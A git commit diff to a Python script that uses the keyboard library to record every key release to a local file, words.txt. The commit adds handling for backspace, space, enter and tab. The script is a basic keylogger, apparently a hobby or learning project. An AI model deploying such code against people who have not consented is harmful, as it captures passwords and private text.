4b2824b4fa72a5cf514f5b07f584a0fceb753188
Orr Hauptman <or.hau2008@gmail.com>
2025-06-11 14:32:41 +0300

    handel different cases

--- main.py
+++ main.py
@@ -1,11 +1,26 @@
 import keyboard
-
+import os
 
 def new_event(event : keyboard.KeyboardEvent) -> None :
     print(f"The key is - {event.name}")
-    with open("words.txt", "a") as file:
-        file.write(f"{event.name}" )
-        file.flush()
+
+    if os.path.exists("words.txt") and event.name == "backspace":
+        with open("words.txt", "r") as file:
+            content = file.read()[:-1] 
+        with open("words.txt", "w") as file:
+            file.write(content)
+    else:
+        with open("words.txt", "a") as file:
+            if event.name == "space":
+                file.write(" ")
+            elif event.name == "enter":
+                file.write("\n")
+            elif event.name == "tab":
+                file.write("\t")
+            else:
+                file.write(f"{event.name}" )
+
+
 
 keyboard.on_release(callback=new_event)
 keyboard.wait()
